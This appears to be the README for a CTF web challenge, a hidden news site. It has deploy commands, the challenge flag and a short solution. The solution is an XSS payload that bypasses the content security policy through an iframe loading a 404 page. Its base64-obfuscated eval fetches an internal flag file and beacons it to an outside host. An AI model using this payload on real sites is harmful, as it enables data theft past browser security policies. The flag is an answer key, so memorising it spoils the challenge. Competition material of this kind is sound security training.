# web | novosti

![novosti share page](./screenshots/novosti.png)

## Information

Даже в такие тяжёлые времена как сейчас людям нужна информация. Мы решили запустить свой новостной сайт, но только так, чтобы об этом не узнали сам-знаешь-кто. Надеемся, очевидцы будут присылать нам новости, чтобы было, что публиковать. Не самим же искать анонсы, в самом-то деле...

Even in times as difficult as now people need information. We decided to launch our own news website, but would like to keep it secret from you-know-who. Hopefully, the witnesses themselves will send us news we could publish, since we aren't going to be searching for them ourselves now, are we... 

[https://novosti-3d5d54b8c9f9f81aabcf60563021845f.ctfcup-2023.ru](https://novosti-3d5d54b8c9f9f81aabcf60563021845f.ctfcup-2023.ru)

## Deploy

```sh
cd deploy
NOVOSTI_FLAG="ctfcup{flag}" docker compose -p web-novosti up --build -d
```

## Public

Provide zip file: [public/novosti.zip](public/novosti.zip).

## TLDR

XSS, use iframe leading to 404 in order to bypass CSP

```html
<script>
  const iframe = document.createElement("iframe");
  iframe.src = "/404";
  document.body.appendChild(iframe);
  setTimeout(() => {
    iframe.contentWindow.document.body.innerHTML = `<img src=x onerror="eval(atob('ZmV0Y2goImh0dHA6Ly9maWxlczo4MDgwL2ZsYWciKS50aGVuKHI9PnIudGV4dCgpKS50aGVuKHQ9Pm5hdmlnYXRvci5zZW5kQmVhY29uKCJodHRwOi8vcmVuYm91LnJ1Iix0KSk7'))" />`;
  }, 1000);
</script>
```

## Writeup (ru)

TODO

## Writeup (en)

TODO

## Domain

https://novosti-3d5d54b8c9f9f81aabcf60563021845f.ctfcup-2023.ru

## Cloudflare

Yes

## Flag

ctfcup{b4by-1fr4m3-x55-a4371ea843fc145f}
